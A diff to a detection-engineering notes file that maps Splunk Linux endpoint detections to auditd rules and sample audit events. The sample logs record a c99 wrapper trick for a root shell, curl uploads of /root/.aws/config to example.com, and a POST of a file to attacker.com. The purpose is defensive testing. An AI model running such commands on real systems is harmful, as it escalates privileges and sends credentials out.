@@ -90,11 +90,11 @@ Source: https://github.com/splunk/security_content/tree/develop/detections/endpo
 | Linux Common Process For Elevation Control |
 | Linux GNU Awk Privilege Escalation |
 | Linux Possible Access To Credential Files |
-| Linux c99 Privilege Escalation |
-| Linux Curl Upload File |
-| Linux Java Spawning Shell |
-| [Linux Deletion Of Services](#Linux-Deletion-Of-Services) |
-| [Linux Iptables Firewall Modification](#Linux Iptables Firewall Modification) | 
+| [Linux c99 Privilege Escalation](#Linux-c99-Privilege-Escalation) | d |
+| [Linux Curl Upload File](#Linux-Curl-Upload-File) | d | 
+| [Linux Java Spawning Shell](#Linux-Deletion-Of-Services) | Not possible |
+| [Linux Deletion Of Services](#Linux-Deletion-Of-Services) | d |
+| [Linux Iptables Firewall Modification](#Linux Iptables Firewall Modification) | d |
 | [Linux File Creation In Init Boot Directory](#Linux-File-Creation-In-Init-Boot-Directory) | d |
 | [Linux Account Manipulation Of SSH Config and Keys](#Linux-Account-Manipulation-Of-SSH-Config-and-Keys) | d |
 | [Linux At Application Execution](#Linux-At-Application-Execution) | d |
@@ -147,6 +147,92 @@ Sample events:
 
 START:
 
+
+
+
+### Linux c99 Privilege Escalation
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+```
+| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
+  as lastTime from datamodel=Endpoint.Processes where Processes.process="*c99*" AND Processes.process="*-wrapper*"  by Processes.dest Processes.user Processes.parent_process_name
+  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
+  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
+  | `security_content_ctime(lastTime)` | `linux_c99_privilege_escalation_filter`
+```
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/28/2023 13:05:44.387:4960) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x562f730c1248 a1=0x562f730d3258 a2=0x562f730e6fc0 a3=0x0 items=3 ppid=14900 pid=14902 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=9 comm=c99 exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=c89_priv_escalation 
+type=EXECVE msg=audit(03/28/2023 13:05:44.387:4960) : argc=5 a0=/bin/sh a1=/bin/c99 a2=-wrapper a3=/bin/sh,-s a4=. 
+type=PATH msg=audit(03/28/2023 13:05:44.387:4960) : item=0 name=/bin/c99 inode=101123553 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/28/2023 13:05:44.387:4960) : proctitle=/bin/sh /bin/c99 -wrapper /bin/sh,-s . 
+type=USER_CMD msg=audit(03/28/2023 13:05:44.376:4957) : pid=14900 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=c99 -wrapper /bin/sh,-s . terminal=pts/1 res=success' 
+type=USER_CMD msg=audit(03/28/2023 13:05:08.025:4574) : pid=14752 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=c99 -wrapper /bin/sh,-s . terminal=pts/1 res=success' 
+```
+
+
+### Linux Curl Upload File
+
+Datamodel: processes
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/28/2023 13:02:17.202:4520) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x558c1a5b8248 a1=0x558c1a5ca258 a2=0x558c1a5defa0 a3=0x0 items=2 ppid=14537 pid=14541 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/28/2023 13:02:17.202:4520) : argc=4 a0=curl a1=-F a2=userfile=@/root/.aws/config a3=http://example.com 
+type=PATH msg=audit(03/28/2023 13:02:17.202:4520) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/28/2023 13:02:17.202:4520) : proctitle=curl -F userfile=@/root/.aws/config http://example.com 
+type=USER_CMD msg=audit(03/28/2023 13:02:17.202:4517) : pid=14537 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl -F userfile=@/root/.aws/config http://example.com terminal=pts/1 res=success' 
+type=SYSCALL msg=audit(03/28/2023 13:02:10.222:4514) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf79aa0 a1=0xf786f0 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=14535 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/28/2023 13:02:10.222:4514) : argc=4 a0=curl a1=-F a2=userfile=@/root/.aws/config a3=http://example.com 
+type=PATH msg=audit(03/28/2023 13:02:10.222:4514) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/28/2023 13:02:10.222:4514) : proctitle=curl -F userfile=@/root/.aws/config http://example.com 
+type=SYSCALL msg=audit(03/28/2023 13:00:53.022:4477) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf79e20 a1=0xf792d0 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=14448 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/28/2023 13:00:53.022:4477) : argc=6 a0=curl a1=-X a2=POST a3=-d a4=@file_to_send a5=http://attacker.com/ 
+type=PATH msg=audit(03/28/2023 13:00:53.022:4477) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/28/2023 13:00:53.022:4477) : proctitle=curl -X POST -d @file_to_send http://attacker.com/ 
+type=SYSCALL msg=audit(03/28/2023 13:00:41.337:4476) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf79940 a1=0xf79270 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=14447 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=EXECVE msg=audit(03/28/2023 13:00:41.337:4476) : argc=5 a0=curl a1=-X a2=POST a3=-d a4=@ 
+type=PATH msg=audit(03/28/2023 13:00:41.337:4476) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/28/2023 13:00:41.337:4476) : proctitle=curl -X POST -d @ 
+```  
+
+
+### Linux Java Spawning Shell
+
+Datamodel: 
+Auditd config:   
+CIM Mapping: 
+Search:  
+Limitations: Not applicable  
+Sample events:    
+
+```
+ 
+```
+
+### Linux Deletion Of Services
+
+Auditd config: ["-w /etc/systemd -p wa -k servicefiles", "-w /usr/lib/systemd -p wa -k systemdfiles", "-w /bin/systemctl -p x -k systemd"]
+CIM Mapping: action, file_path, file_name, dest, process_guid
+Search: No change required.  
+Limitations:  
+Sample events:    
+
+```
+type=PATH msg=audit(03/28/2023 12:48:02.751:4276) : item=1 name=/etc/systemd/test4.service inode=616118 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PATH msg=audit(03/28/2023 12:48:00.322:4260) : item=1 name=/etc/systemd/test3.service inode=616117 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PATH msg=audit(03/28/2023 12:47:58.292:4252) : item=1 name=/etc/systemd/test2.service inode=616116 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PATH msg=audit(03/28/2023 12:47:55.851:4244) : item=1 name=/etc/systemd/test1.service inode=616115 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0
+```
 
 
 
@@ -1392,21 +1478,6 @@ Comments: will not work as the search is looking for process containing "echo" a
 PROCESS & FILESYSYTEM
 
 This is a ttp search - will require new search to be built
-
-### Linux Deletion Of Services
-
-PROCESS
-
-Auditd config: ["-w /etc/systemd -p wa -k servicefiles", "-w /usr/lib/systemd -p wa -k systemdfiles", "-w /bin/systemctl -p x -k systemd"]
-CIM Mapping: action, file_path, file_name, dest, process_guid
-Search: No change required.  
-Limitations:  
-Sample events:    
-
-```
-zxcv
-
-```
 
 
 
